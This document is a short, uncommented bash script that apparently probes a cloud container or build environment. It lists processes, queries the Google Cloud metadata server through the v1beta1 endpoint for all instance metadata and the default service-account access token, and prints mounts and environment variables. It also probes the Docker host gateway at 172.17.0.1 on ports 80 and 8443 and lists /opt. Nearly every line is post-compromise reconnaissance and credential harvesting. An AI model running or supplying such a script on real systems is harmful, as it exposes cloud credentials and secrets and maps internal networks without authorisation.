#!/bin/bash
# -*- coding: UTF8 -*-
ps -aux
echo "token :"
curl 'http://metadata.google.internal/computeMetadata/v1beta1?alt=json&recursive=true'
echo "token :"
curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'
mount

curl -vv 'http://172.17.0.1/'
curl -vv 'http://172.17.0.1:8443/'


env
echo "/opt search :"
find /opt
